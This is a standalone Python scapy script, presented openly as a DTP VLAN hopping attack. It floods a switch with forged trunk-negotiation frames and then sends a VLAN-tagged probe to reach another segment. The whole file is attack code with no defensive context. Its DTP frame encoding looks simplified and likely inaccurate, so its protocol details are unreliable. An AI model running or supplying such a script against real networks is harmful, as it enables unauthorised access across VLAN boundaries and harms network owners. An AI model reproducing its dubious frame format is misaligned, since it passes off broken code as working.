from scapy.all import *
import time

class DTPVlanHoppingAttack:
    def __init__(self, interface):
        """
        Initialize DTP VLAN Hopping Attack
        
        :param interface: Network interface to use
        """
        self.interface = interface
    
    def generate_dtp_packet(self):
        """
        Craft a malicious DTP packet to negotiate trunk mode
        """
        # Cisco proprietary DTP frame
        dtp_packet = Ether(
            dst="01:00:0c:cc:cc:cc",  # Cisco DTP multicast address
            src=RandMAC(),
            type=0x0006  # Cisco proprietary type
        )/Raw(
            load=bytes.fromhex(
                "0103000000000000"  # DTP negotiation payload
                "0101"              # Trunk mode request
                "0002"              # Trunk mode
            )
        )
        
        return dtp_packet
    
    def flood_dtp_negotiate(self, num_packets=100):
        """
        Flood switch with DTP negotiation packets
        
        :param num_packets: Number of packets to send
        """
        print("[*] Initiating DTP VLAN Negotiation Attack")
        
        try:
            for i in range(num_packets):
                # Generate and send DTP packet
                dtp_pkt = self.generate_dtp_packet()
                sendp(dtp_pkt, 
                      iface=self.interface, 
                      verbose=False)
                
                print(f"[+] Sent DTP Negotiation Packet {i+1}")
                time.sleep(0.1)
        
        except KeyboardInterrupt:
            print("\n[*] DTP Attack Stopped")
        except Exception as e:
            print(f"[!] Attack Error: {e}")
    
    def vlan_hopping_exploit(self):
        """
        Attempt VLAN hopping by exploiting DTP
        """
        print("[*] Preparing VLAN Hopping Exploit")
        
        # Craft a VLAN-tagged frame
        vlan_hop_frame = Ether(
            dst="ff:ff:ff:ff:ff:ff",  # Broadcast
            src=RandMAC()
        )/Dot1Q(
            vlan=1  # Try to access native/default VLAN
        )/IP(
            src="10.0.0.100",
            dst="10.0.0.1"
        )/ICMP()
        
        print("[+] Sending VLAN Hopping Probe")
        sendp(vlan_hop_frame, 
              iface=self.interface, 
              verbose=False)

def main():
    # Initialize the attack
    attack = DTPVlanHoppingAttack(
        interface='eth0'  # Replace with your network interface
    )
    
    # Sequence of attack methods
    print("[*] Starting DTP VLAN Hopping Attack")
    
    # 1. Flood with DTP negotiation packets
    attack.flood_dtp_negotiate(num_packets=50)
    
    # 2. Attempt VLAN hopping
    attack.vlan_hopping_exploit()

if __name__ == '__main__':
    main()